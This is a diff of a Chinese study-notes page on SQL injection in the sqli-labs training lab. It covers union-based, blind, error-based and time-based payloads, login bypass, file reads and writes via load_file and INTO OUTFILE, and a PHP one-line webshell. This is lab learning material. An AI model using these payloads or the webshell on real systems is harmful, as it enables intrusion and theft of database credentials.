@@ -8820,9 +8820,9 @@
 <li>@@version_compile_os——操作系统版本</li>
 </ol>
 <h3 id="_2">系统表介绍</h3>
-<p>SCHEMATA表：提供了关于数据库的信息。
-TABLES表：给出了关于数据库中的表的信息。
-COLUMNS表：给出了表中的列信息。
+<p>SCHEMATA表：提供了关于数据库的信息。<br />
+TABLES表：给出了关于数据库中的表的信息。<br />
+COLUMNS表：给出了表中的列信息。<br />
 STATISTICS表：给出了关于表索引的信息。</p>
 <h3 id="_3">字符连接函数</h3>
 <ol>
@@ -8831,272 +8831,272 @@ STATISTICS表：给出了关于表索引的信息。</p>
 <li>group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</li>
 </ol>
 <h3 id="_4">测试语句</h3>
-<p>or 1=1--+
-' or 1=1--+
-" or 1=1--+
-) or 1=1--+
-') or 1=1--+
-") or 1=1--+
-")) or 1=1--+
-一般情况代码为：
-$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
-加入测试语句后：' or 1=1--+
+<p>or 1=1--+<br />
+' or 1=1--+<br />
+" or 1=1--+<br />
+) or 1=1--+<br />
+') or 1=1--+<br />
+") or 1=1--+<br />
+")) or 1=1--+<br />
+一般情况代码为：<br />
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";<br />
+加入测试语句后：' or 1=1--+<br />
 $sql="SELECT * FROM users WHERE id='$id' or 1=1--+' LIMIT 0,1";</p>
-<p>union操作符：
-用于合并两个或多个select语句
-SELECT column_name(s) FROM table_name1
-UNION
-SELECT column_name(s) FROM table_name2
-UNION 内部的 SELECT
-语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的
+<p>union操作符：<br />
+用于合并两个或多个select语句<br />
+SELECT column_name(s) FROM table_name1<br />
+UNION<br />
+SELECT column_name(s) FROM table_name2<br />
+UNION 内部的 SELECT<br />
+语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的<br />
 列的顺序必须相同</p>
 <h4 id="less-1">less-1:</h4>
-<p>先添加单引号，报错，证明有sql漏洞
-You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
-说明查询语句是：
-SELECT * FROM users WHERE id='$id' LIMIT 0,1
+<p>先添加单引号，报错，证明有sql漏洞<br />
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1<br />
+说明查询语句是：<br />
+SELECT * FROM users WHERE id='$id' LIMIT 0,1<br />
 <strong>'</strong>'1'' LIMIT 0,1<strong>'</strong></p>
-<p>尝试' or 1=1--+
---+是为了把后面的注释掉
-'order by 4--+得到列数
--1'union select 1,2,3--+
-显示出2,3，说明这里可以回显
-爆库：
-union select 1,group_concat(schema_name),3 from information_schema.schemata--+
-查询schema_name（库名）并放到一个组里
-从information_schema.schemata（存放所有数据库名的表）里面
-爆表：
-union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+
-查询table_name（表名）的信息放在一个组里
-从information_schema.tables（存放所有表名的地方）中table_schema='security'的地方
-爆列：
-union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
-查询column_name（列名）的信息，放在一个组里
-从information_schema.coulmns（存放所有列名的表）中table_name='users'的地方
-爆数据：
-union select 1,username,password from users where id=2--+
+<p>尝试' or 1=1--+<br />
+--+是为了把后面的注释掉<br />
+'order by 4--+得到列数<br />
+-1'union select 1,2,3--+<br />
+显示出2,3，说明这里可以回显<br />
+爆库：<br />
+union select 1,group_concat(schema_name),3 from information_schema.schemata--+<br />
+查询schema_name（库名）并放到一个组里<br />
+从information_schema.schemata（存放所有数据库名的表）里面<br />
+爆表：<br />
+union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+<br />
+查询table_name（表名）的信息放在一个组里<br />
+从information_schema.tables（存放所有表名的地方）中table_schema='security'的地方<br />
+爆列：<br />
+union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+<br />
+查询column_name（列名）的信息，放在一个组里<br />
+从information_schema.coulmns（存放所有列名的表）中table_name='users'的地方<br />
+爆数据：<br />
+union select 1,username,password from users where id=2--+<br />
 从users表中的id=2的地方查询username和password的内容</p>
 <h4 id="less-2">less-2:</h4>
-<p>单引号报错
-You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1
-说明查询语句是：
-SELECT * FROM users WHERE id=$id LIMIT 0,1
-'' LIMIT 0,1'
-查询代码使用了整数
+<p>单引号报错<br />
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1<br />
+说明查询语句是：<br />
+SELECT * FROM users WHERE id=$id LIMIT 0,1<br />
+'' LIMIT 0,1'<br />
+查询代码使用了整数<br />
 可以使用不加单引号的or 1=1</p>
 <h4 id="less-3">less-3:</h4>
-<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1
-说明查询语句是：
-SELECT * FROM users WHERE id=('$id') LIMIT 0,1
-''1'') LIMIT 0,1'
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1<br />
+说明查询语句是：<br />
+SELECT * FROM users WHERE id=('$id') LIMIT 0,1<br />
+''1'') LIMIT 0,1'<br />
 可以使用') 或) 把前面闭合</p>
 <h4 id="less-4">less-4:</h4>
-<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1
-说明查询语句是：
-SELECT * FROM users WHERE id=("$id") LIMIT 0,1
-'"1"") LIMIT 0,1'
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1<br />
+说明查询语句是：<br />
+SELECT * FROM users WHERE id=("$id") LIMIT 0,1<br />
+'"1"") LIMIT 0,1'<br />
 可以使用：")闭合就行了</p>
 <h2 id="562">5~6背景知识2：</h2>
 <p>盲注：数据不能回显到前端页面，我们需要利用一些方法进行判断或者尝试</p>
 <h3 id="sql">基于布尔 SQL 盲注</h3>
 <p>----------构造逻辑判断</p>
-<p>（知识）SQL注入截取字符串常用函数：
-<a href="http://www.cnblogs.com/lcamry/p/5504374.html">http://www.cnblogs.com/lcamry/p/5504374.html</a>
-1.mid(column_name,start[,length])
-column_name——要提取的字段
-start——规定开始位置
+<p>（知识）SQL注入截取字符串常用函数：<br />
+<a href="http://www.cnblogs.com/lcamry/p/5504374.html">http://www.cnblogs.com/lcamry/p/5504374.html</a><br />
+1.mid(column_name,start[,length])<br />
+column_name——要提取的字段<br />
+start——规定开始位置<br />
 length——要返回的字符数， 如果省略，则mid() 函数返回剩余文本</p>
-<p>例如str="123456"
+<p>例如str="123456"<br />
 mid(str,2,1)  -----&gt;结果为2</p>
-<p>mid(database(),1,1)&gt;'a'，查看数据库的第一位，
+<p>mid(database(),1,1)&gt;'a'，查看数据库的第一位，<br />
 mid(database(),2,1)&gt;'a'，产看数据库的第二位，</p>
 <p>MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;'a'此处column_name参数可以为sql语句，可自行构造sql语句进行注入</p>
 <p>2.substr(string,start,length)</p>
-<p>substr(DATABASE(),1,1)&gt;'a',查看数据库名第一位，
-substr(DATABASE(),2,1)&gt;'a',查看数据库名第二位，
+<p>substr(DATABASE(),1,1)&gt;'a',查看数据库名第一位，<br />
+substr(DATABASE(),2,1)&gt;'a',查看数据库名第二位，<br />
 substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;'a'此处string参数可以为sql语句，可自行构造sql语句进行注入。</p>
 <p>3.left(string,n)</p>
-<p>left(database(),1)&gt;'a',查看数据库名的第一位
+<p>left(database(),1)&gt;'a',查看数据库名的第一位<br />
 left(database(),2)&gt;'a',查看数据库名的第二位</p>
-<p>再用ord(上面的函数)&gt;数字（ASCII码值）
+<p>再用ord(上面的函数)&gt;数字（ASCII码值）<br />
 ord(mid(database(),1,1))&gt;144</p>
 <p>检查database()的第一位ASCⅡ码是否大于144</p>
-<p>regexp正则注入：
-<a href="http://www.cnblogs.com/lcamry/articles/5717442.html">http://www.cnblogs.com/lcamry/articles/5717442.html</a>
-用法：select user() regexp '^r';
-检验是否存在r中，在MySQL中会显示1
-但是在网页上可以用
+<p>regexp正则注入：<br />
+<a href="http://www.cnblogs.com/lcamry/articles/5717442.html">http://www.cnblogs.com/lcamry/articles/5717442.html</a><br />
+用法：select user() regexp '^r';<br />
+检验是否存在r中，在MySQL中会显示1<br />
+但是在网页上可以用<br />
 select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);</p>
 <p>limit只是作用于前面的security的，想测试别的表名只是改一下表名就行</p>
-<p>like匹配注入
-select user() like 'ro%'
+<p>like匹配注入<br />
+select user() like 'ro%'<br />
 beecheck()重复执行</p>
-<p>笛卡尔积：
-如果user表中有4条数据
-select count(*) from user A, user B
+<p>笛卡尔积：<br />
+如果user表中有4条数据<br />
+select count(*) from user A, user B<br />
 得：16</p>
 <h3 id="sql_1">基于报错的 SQL 盲注</h3>
 <p>——构造payload让信息通过错误提示回显出来</p>
 <p>MySQL的一个漏洞可以让信息显示出来</p>
-<p>Select 1,count(<em>),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)</em>2))a from information_schema.columns group by a;
-简化为
+<p>Select 1,count(<em>),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)</em>2))a from information_schema.columns group by a;<br />
+简化为<br />
 select count(<em>) from information_schema.tables group by concat(version(), floor(rand(0)</em>2))</p>
-<p>如果关键的表被禁用了，可以用：
-select count(<em>) from (select 1 union select null union
+<p>如果关键的表被禁用了，可以用：<br />
+select count(<em>) from (select 1 union select null union<br />
 select !1) group by concat(version(),floor(rand(0)</em>2))</p>
-<p>如果rand被禁用了，可以用：
+<p>如果rand被禁用了，可以用：<br />
 select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</p>
-<p>select exp(~(select * from(select user())a))  //double数值类型超出范围
+<p>select exp(~(select * from(select user())a))  //double数值类型超出范围<br />
 参考文章：<a href="http://www.cnblogs.com/lcamry/articles/5509124.html">http://www.cnblogs.com/lcamry/articles/5509124.html</a></p>
-<p>select !(select * from (select user())x)   //bigint超出范围
-参考文章
+<p>select !(select * from (select user())x)   //bigint超出范围<br />
+参考文章<br />
 <a href="http://www.cnblogs.com/lcamry/articles/5509112.html">http://www.cnblogs.com/lcamry/articles/5509112.html</a></p>
-<p>extractvalue(1,concat(0x7e,(select @@version),0x7e))
+<p>extractvalue(1,concat(0x7e,(select @@version),0x7e))<br />
 mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</p>
-<p>updatexml(1,concat(0x7e,(select @@version),0x7e),1)
+<p>updatexml(1,concat(0x7e,(select @@version),0x7e),1)<br />
 mysql对xml数据进行查询和修改的 xpath 函数，xpath 语法错误</p>
-<p>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
+<p>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;<br />
 mysql 重复特性，此处重复了 version，所以报错</p>
 <p>•基于时间的 SQL 盲注——延时注入</p>
 <p>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if 判断语句，条件为假，执行 sleep</p>
-<p>select sleep (find_in_set(mid(@@version,1,1),'0,1,2,3,4,5,6,7,8,9,.'));
+<p>select sleep (find_in_set(mid(@@version,1,1),'0,1,2,3,4,5,6,7,8,9,.'));<br />
 在0-9之间寻找版本号的第一位</p>
 <h4 id="less-56">less-5~6:</h4>
-<p>less-5
-布尔盲注：
+<p>less-5<br />
+布尔盲注：<br />
 构造?id=1  发现返回you are in....不会返回信息了，说明是盲注</p>
-<p>'and left (version(),1)=5%23（测试数据库版本第一位是不是5）
+<p>'and left (version(),1)=5%23（测试数据库版本第一位是不是5）<br />
 返回正常,前面那个单引号是为了闭合变量id</p>
-<p>'and length(database())=8%23
+<p>'and length(database())=8%23<br />
 测试数据库长度</p>
-<p>'and left(database(),1)&gt;'a'--+
+<p>'and left(database(),1)&gt;'a'--+<br />
 测试数据库第一位是否大于a</p>
-<p>'and left(database(),2)&gt;'sa'--+
+<p>'and left(database(),2)&gt;'sa'--+<br />
 测试数据库前两位是否大于sa</p>
 <p>'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80--+</p>
 <p>检测数据表的第一个字符是否大于ascii 80</p>
-<p>'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;80--+
-检测数据表的第二个字符是否大于ascii80
+<p>'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;80--+<br />
+检测数据表的第二个字符是否大于ascii80<br />
 此处limit限制的仍然是表的第几个，所以希望查看别的表的时候可以更改limit,即，第二个表测试的时候可改为limit 1,1</p>
-<p>' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1)--+
+<p>' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1)--+<br />
 检测users表中是否含有带有us的列名</p>
-<p>这里select 1 from.....表里如果有记录，就显示1
+<p>这里select 1 from.....表里如果有记录，就显示1<br />
 简单理解就是不查询具体列，只要有值就显示1</p>
-<p>' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1)--+
+<p>' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1)--+<br />
 检测表users中是否含有username的列名</p>
-<p>利用ord()和mid()获取users表内容
-' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+
+<p>利用ord()和mid()获取users表内容<br />
+' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+<br />
 获取表中username第一行第一个字段值ascii与68比较</p>
-<p>基于错误的盲注
-固定格式                                                     想要查询的内容
-' union Select 1,count(<em>),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)</em>2))a from information_schema.columns group by a--+
+<p>基于错误的盲注<br />
+固定格式                                                     想要查询的内容<br />
+' union Select 1,count(<em>),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)</em>2))a from information_schema.columns group by a--+<br />
 当在一个聚合函数如count()函数后面，如果使用分组语句如group by就会把查询的一部分以错误的形式显示出来</p>
 <p>基于时间的盲注</p>
 <p>'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</p>
-<p>当条件不成立，即错误时会有5秒钟的延时
-关于if语句： if(condition,ture,false) 若条件正确，执行ture,不正确执行false
+<p>当条件不成立，即错误时会有5秒钟的延时<br />
+关于if语句： if(condition,ture,false) 若条件正确，执行ture,不正确执行false<br />
 'and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80,1,sleep(5))--+</p>
-<p>'and if(ascii(substr((select column_name from information_schema.columns where table_name='users'),1,1))&gt;80,1,sleep(5))--+
-显示子查询由多行，还是不要用延时注入了，用正则表达式吧
-' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1)--+
+<p>'and if(ascii(substr((select column_name from information_schema.columns where table_name='users'),1,1))&gt;80,1,sleep(5))--+<br />
+显示子查询由多行，还是不要用延时注入了，用正则表达式吧<br />
+' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1)--+<br />
 ' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1)--+</p>
-<p>less-6
-$id = '"'.$id.'"';
-$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
+<p>less-6<br />
+$id = '"'.$id.'"';<br />
+$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";<br />
 对传参进行了设置，闭合语句换了，把第五关的单引号换成双引号</p>
 <h2 id="3">背景知识3：</h2>
-<p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串
-使用条件：
-1.使用and (selectcountfrom mysql.user)&gt;0/*若返回正常，则说明有权限
-2.读取的文件必须在服务器上
-3.必须提供完整路径
+<p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串<br />
+使用条件：<br />
+1.使用and (selectcountfrom mysql.user)&gt;0/*若返回正常，则说明有权限<br />
+2.读取的文件必须在服务器上<br />
+3.必须提供完整路径<br />
 4.文件必须小于max_allowed_packet</p>
-<p>Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)))
+<p>Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)))<br />
 利用 hex()将文件内容导出来，尤其是 smb 文件时可以使用。</p>
-<p>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))
+<p>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))<br />
 Explain："char(99,58,47,98,111,111,116,46,105,110,105)" 就是"c:/boot.ini"的 ASCII 代码</p>
-<p>-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)
+<p>-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)<br />
 Explain："c:/boot.ini"的 16 进制是"0x633a2f626f6f742e696e69"</p>
-<p>-1 union select 1,1,1,load_file(c:\boot.ini)
+<p>-1 union select 1,1,1,load_file(c:\boot.ini)<br />
 Explain:路径里的/用 \代替</p>
-<p>文件导入到数据库
-当你具有数据库的权限时，可以将系统文件利用 load data infile 导入到数据库中
-实例：
+<p>文件导入到数据库<br />
+当你具有数据库的权限时，可以将系统文件利用 load data infile 导入到数据库中<br />
+实例：<br />
 load data infile '/tmp/t0.txt' ignore into table t0 character set gbk fields terminated by '\t' lines terminated by '\n'</p>
 <p>把/tmp/t0.txt导入到t0表中，character set gbk 是字符集设置为 gbk，fields terminated by 是每一项数据之间的分隔符，lines terminated by 是行的结尾符</p>
-<p>SELECT.....INTO OUTFILE 'file_name'
-把被选择的行写入一个文件中必须有file权限
-一般有两种形式
-直接将select内容写入文件
-Select version() into outfile"c:\phpnow\htdocs\test.php"
+<p>SELECT.....INTO OUTFILE 'file_name'<br />
+把被选择的行写入一个文件中必须有file权限<br />
+一般有两种形式<br />
+直接将select内容写入文件<br />
+Select version() into outfile"c:\phpnow\htdocs\test.php"<br />
 也可以把version()换成一句话木马，在用菜刀连接</p>
 <?php @eval($_post["shadow"])?>
 
-<p>Select version() Into outfile"c:\phpnow\htdocs\test.php" LINES TERMINATED BY 0x16 进制文件
+<p>Select version() Into outfile"c:\phpnow\htdocs\test.php" LINES TERMINATED BY 0x16 进制文件<br />
 解释：通常是用‘\r\n’结尾，此处我们修改为自己想要的任何文件。同时可以用 FIELDS TERMINATED BY</p>
 <h4 id="less-7">less-7</h4>
-<p>首先使用and (select count(<em>) from mysql.user)&gt;0/</em>测试是否有读写权限，若有则返回正常
+<p>首先使用and (select count(<em>) from mysql.user)&gt;0/</em>测试是否有读写权限，若有则返回正常<br />
 构造注释掉')) or 1=1--+</p>
-<p>在指定文件夹创建uuu.txt
-<a href="http://localhost/sqli-labs-master/Less-7/?id=1%27">http://localhost/sqli-labs-master/Less-7/?id=1'))UNION</a>)UNION) SELECT 1,2,3 into outfile "d:\webanquan\zkaq\WWW\sqli-labs-master\Less-7\uuu.txt"%23
-针对无法写入
-https://www.jianshu.com/p/7b9256de20d1
-https://blog.csdn.net/weixin_39631030/article/details/79873936
-无法写入是因为MySQL的secure_file_priv设置为null，不允许读写
+<p>在指定文件夹创建uuu.txt<br />
+<a href="http://localhost/sqli-labs-master/Less-7/?id=1%27">http://localhost/sqli-labs-master/Less-7/?id=1'))UNION</a>)UNION) SELECT 1,2,3 into outfile "d:\webanquan\zkaq\WWW\sqli-labs-master\Less-7\uuu.txt"%23<br />
+针对无法写入<br />
+https://www.jianshu.com/p/7b9256de20d1<br />
+https://blog.csdn.net/weixin_39631030/article/details/79873936<br />
+无法写入是因为MySQL的secure_file_priv设置为null，不允许读写<br />
 方法：打开MySQL的安装目录下的my.ini，在mysqld模块里添加secure_file_priv = ''    记得改完后重启mysql服务</p>
-<p>还可以用这种方法把一句话木马写进去，用菜刀连接，虽然我不能连接成功
+<p>还可以用这种方法把一句话木马写进去，用菜刀连接，虽然我不能连接成功<br />
 '&lt;?php @eval($_GET["chen"])?&gt;'</p>
 <h4 id="less-810">less-8~10</h4>
-<p>都是用前面背景知识3，基本都是基于时间的盲注，大致思路如下
-猜测数据库：
-<a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--">http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--</a>+
-说明第一位是 s （ascii 码是 115）
-<a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))--">http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))--</a>+
-说明第一位是 e （ascii 码是 101）
-....
-以此类推，我们知道了数据库名字是 security
-猜测 security  的数据表：
-<a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and">http://127.0.0.1/sqllib/Less-9/?id=1'and</a> If(ascii(substr((select table_name from information_s
-chema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))--+
-猜测第一个数据表的第一位是 e,...依次类推，得到 emails
-<a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and">http://127.0.0.1/sqllib/Less-9/?id=1'and</a> If(ascii(substr((select table_name from information_s
-chema.tables where table_schema='security' limit 1,1),1,1))=114,1,sleep(5))--+
-猜测第二个数据表的第一位是 r,...依次类推，得到 referers
-...
-再以此类推，我们可以得到所有的数据表 emails,referers,uagents,users
-猜测 users  表的列：
-<a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and">http://127.0.0.1/sqllib/Less-9/?id=1'and</a> If(ascii(substr((select column_name from information
-_schema.columns where table_name='users' limit 0,1),1,1))=105,1,sleep(5))--+
-猜测 users 表的第一个列的第一个字符是 i，
-以此类推，我们得到列名是 id，username，password
-猜测 username  的值：
-<a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and">http://127.0.0.1/sqllib/Less-9/?id=1'and</a> If(ascii(substr((select username from users limit 0,1),
-1,1))=68,1,sleep(5))--+
-猜测 username 的第一行的第一位
+<p>都是用前面背景知识3，基本都是基于时间的盲注，大致思路如下<br />
+猜测数据库：<br />
+<a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--">http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--</a>+<br />
+说明第一位是 s （ascii 码是 115）<br />
+<a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))--">http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))--</a>+<br />
+说明第一位是 e （ascii 码是 101）<br />
+....<br />
+以此类推，我们知道了数据库名字是 security<br />
+猜测 security  的数据表：<br />
+<a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and">http://127.0.0.1/sqllib/Less-9/?id=1'and</a> If(ascii(substr((select table_name from information_s<br />
+chema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))--+<br />
+猜测第一个数据表的第一位是 e,...依次类推，得到 emails<br />
+<a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and">http://127.0.0.1/sqllib/Less-9/?id=1'and</a> If(ascii(substr((select table_name from information_s<br />
+chema.tables where table_schema='security' limit 1,1),1,1))=114,1,sleep(5))--+<br />
+猜测第二个数据表的第一位是 r,...依次类推，得到 referers<br />
+...<br />
+再以此类推，我们可以得到所有的数据表 emails,referers,uagents,users<br />
+猜测 users  表的列：<br />
+<a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and">http://127.0.0.1/sqllib/Less-9/?id=1'and</a> If(ascii(substr((select column_name from information<br />
+_schema.columns where table_name='users' limit 0,1),1,1))=105,1,sleep(5))--+<br />
+猜测 users 表的第一个列的第一个字符是 i，<br />
+以此类推，我们得到列名是 id，username，password<br />
+猜测 username  的值：<br />
+<a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and">http://127.0.0.1/sqllib/Less-9/?id=1'and</a> If(ascii(substr((select username from users limit 0,1),<br />
+1,1))=68,1,sleep(5))--+<br />
+猜测 username 的第一行的第一位<br />
 以此类推，我们得到数据库 username，password 的所有内容</p>
 <h4 id="less-1112">less-11~12：</h4>
-<p>post注入
-用户名：admin'
-密码：111
-报错：'111' LIMIT 0,1'
-You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1111' LIMIT 0,1' at line 1
-出错原因应该是password字段被引号包起来了，导致引号不匹配
+<p>post注入<br />
+用户名：admin'<br />
+密码：111<br />
+报错：'111' LIMIT 0,1'<br />
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1111' LIMIT 0,1' at line 1<br />
+出错原因应该是password字段被引号包起来了，导致引号不匹配<br />
 select username,password from users where username='admin'' and password='111' limit 0,1</p>
-<p>构造语句 admin' or '1'='1
+<p>构造语句 admin' or '1'='1<br />
 密码随意，登录成功</p>
-<p>用户名：admin'
-密码：admin
-报错，返回信息 ''admin'' and password='' LIMIT 0,1' 
+<p>用户名：admin'<br />
+密码：admin<br />
+报错，返回信息 ''admin'' and password='' LIMIT 0,1' <br />
 可以推断出都是'username'  'password'  单引号分开</p>
-<p>Username：1admin'union select 1,database()#     这里不明白，1admin  前面是数字就行，把数字放后面就不行了，admin1可能是存在这么一个用户名，没法激发后面的联合查询
-passwd=1（任意密码）       密码随意是因为#那后面的注释掉了
+<p>Username：1admin'union select 1,database()#     这里不明白，1admin  前面是数字就行，把数字放后面就不行了，admin1可能是存在这么一个用户名，没法激发后面的联合查询<br />
+passwd=1（任意密码）       密码随意是因为#那后面的注释掉了<br />
 返回数据库名称</p>
 <h4 id="less-1314">less-13~14:</h4>
-<p>先单引号测试，再根据返回的错误信息，构造语句
-这一关是') or 1=1--+
-可以发现登录成功或失败只显示登录成功或失败
-登录成功后不会显示用户名和密码，所以，需要用到盲注
-用户名：admin')and mid(database(),1,1)&gt;'a'#
+<p>先单引号测试，再根据返回的错误信息，构造语句<br />
+这一关是') or 1=1--+<br />
+可以发现登录成功或失败只显示登录成功或失败<br />
+登录成功后不会显示用户名和密码，所以，需要用到盲注<br />
+用户名：admin')and mid(database(),1,1)&gt;'a'#<br />
 密码：随意</p>
 <h4 id="less-1516">less-15~16:</h4>
 <p>盲注，简直是够了，什么错误都不显示，除了登录成功与否，只能把所有如：'    "    ')     '))      "))方法试一遍</p>
@@ -9104,46 +9104,46 @@ passwd=1（任意密码）       密码随意是因为#那后面的注释掉
 <h3 id="mysql">MySQL数据库中的增删改查</h3>
 <p>查就是select,增是insert,删就是delect或drop,改就是update</p>
 <p>增：insert into users values('16','lcamry','lcamry');</p>
-<p>删：
-删数据
-delete from 表名;
-delete from 表名 where id=1;
-删节构
-删数据库：drop database数据库名;
-删除表：drop table 表名;
+<p>删：<br />
+删数据<br />
+delete from 表名;<br />
+delete from 表名 where id=1;<br />
+删节构<br />
+删数据库：drop database数据库名;<br />
+删除表：drop table 表名;<br />
 删除表中的列:alter table 表名 drop column 列名;</p>
-<p>改：
-修改所有：updata 表名 set 列名='新的值，非数字加单引号' ;
+<p>改：<br />
+修改所有：updata 表名 set 列名='新的值，非数字加单引号' ;<br />
 带条件的修改：updata 表名 set 列名='新的值，非数字加单引号' where id=6;</p>
-<p>addslashes()函数返回在预定义字符之前添加反斜杠的字符串
-预定义字符：单引号，双引号，反斜杠，null
-该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串
+<p>addslashes()函数返回在预定义字符之前添加反斜杠的字符串<br />
+预定义字符：单引号，双引号，反斜杠，null<br />
+该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串<br />
 用了这个以后就不能用'或"来闭合前面的语句了</p>
 <p>stripslashes()删除由addslashes()添加的反斜线</p>
-<p>mysql_real_escape_string(string,connection)转义sql语句中使用字符串中的特殊字符
-\x00
-\n
-\r
-'
-"
-\x1a
+<p>mysql_real_escape_string(string,connection)转义sql语句中使用字符串中的特殊字符<br />
+\x00<br />
+\n<br />
+\r<br />
+'<br />
+"<br />
+\x1a<br />
 都会受到影响，若成功，返回被转义的字符串，若失败，返回false</p>
 <h4 id="less-17">less-17:</h4>
-<p>（这题我还以为是用更改数据的方式改密码呐，原来是在改密码的界面爆数据。。。）
-本关中的username被限制了，所以只能在password输入
-输入：
-123' and (updatexml(1,concat(0x5c,version(),0x5c),1))#
+<p>（这题我还以为是用更改数据的方式改密码呐，原来是在改密码的界面爆数据。。。）<br />
+本关中的username被限制了，所以只能在password输入<br />
+输入：<br />
+123' and (updatexml(1,concat(0x5c,version(),0x5c),1))#<br />
 在concat()里替换成要查询的语句，注意用括号括起来，并且需要limit限制，不然查询不出来</p>
 <h4 id="less-18">less-18:</h4>
-<p>输入admin，admin测试后发现会查询IP和user agent，所以通过burp抓包后修改这两个地方的参数，加入sql查询语句
